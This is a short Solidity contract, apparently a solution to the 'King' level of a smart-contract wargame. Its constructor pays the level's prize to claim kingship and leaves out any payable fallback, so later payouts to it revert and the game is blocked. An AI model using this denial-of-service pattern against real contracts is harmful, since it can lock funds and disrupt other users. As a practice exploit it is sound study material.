// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level09.sol";

contract Attacker
{
    King level09;

    constructor(address payable _level09) public payable 
    {
        level09 = King(_level09);
        address(level09).call{value: level09.prize()}("");
    } 

    function getBalance() external returns (uint) 
    {
        return address(this).balance;
    }
}